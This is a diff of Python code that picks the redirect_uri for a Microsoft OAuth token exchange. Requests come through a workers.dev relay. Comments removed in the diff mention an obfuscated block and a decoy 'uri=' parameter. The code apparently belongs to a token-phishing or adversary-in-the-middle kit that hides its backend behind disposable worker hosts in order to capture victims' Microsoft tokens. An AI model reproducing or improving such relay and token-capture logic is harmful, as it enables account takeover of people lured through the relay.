@@ -675,29 +675,41 @@ def resolve_token_exchange_redirect_uri(
     """
     Resolves the correct redirect_uri for the token exchange POST.
 
-    KEY INSIGHT from sample URL analysis:
-    The real redirect_uri is hidden inside the obfuscated block
-    and is always REDIRECT_URI (the direct backend callback URL).
+    Microsoft redirected to the worker URL during authorize.
+    The token exchange must use the SAME worker URL.
+    Microsoft validates that the token exchange redirect_uri
+    matches what was used in the authorize request.
 
-    The uri= visible param is a decoy showing the worker URL.
-    Microsoft does NOT use uri= as the redirect_uri.
-    Microsoft uses the redirect_uri from inside the obfuscated block.
+    If relay_host is present the request came via worker.
+    Reconstruct the worker URL from relay_host.
+    This matches what Microsoft used during authorize.
 
-    Therefore the token exchange must always use REDIRECT_URI
-    regardless of whether the request came via worker relay or direct.
-
-    relay_host is logged for debugging but not used to build the URI.
+    If relay_host is absent the request came direct.
+    Fall back to REDIRECT_URI.
     """
+    if relay_host:
+        # Reconstruct worker URL from relay_host
+        # relay_host = 046567-043-241d.dorseym410.workers.dev
+        # result     = https://046567-043-241d.dorseym410.workers.dev
+        # No path — Microsoft registered the base domain only
+        worker_redirect_uri = f"https://{relay_host}"
+        print(
+            f"[auth] resolve_token_exchange_redirect_uri\n"
+            f"  source=worker_relay\n"
+            f"  relay_host={relay_host}\n"
+            f"  resolved_redirect_uri={worker_redirect_uri}"
+        )
+        return worker_redirect_uri
+
+    # No relay — direct backend callback
+    # This should not happen once worker is working correctly
     print(
         f"[auth] resolve_token_exchange_redirect_uri\n"
-        f"  relay_host={relay_host}\n"
-        f"  relay_path={relay_path}\n"
+        f"  source=direct\n"
         f"  resolved_redirect_uri={REDIRECT_URI}\n"
-        f"  reason=real redirect_uri is always backend URL"
-        f" hidden inside obfuscated block"
+        f"  WARNING: expected worker relay but got direct callback"
     )
     return REDIRECT_URI
-
 
 # =========================
 # TOKEN EXCHANGE (OAUTH CALLBACK)
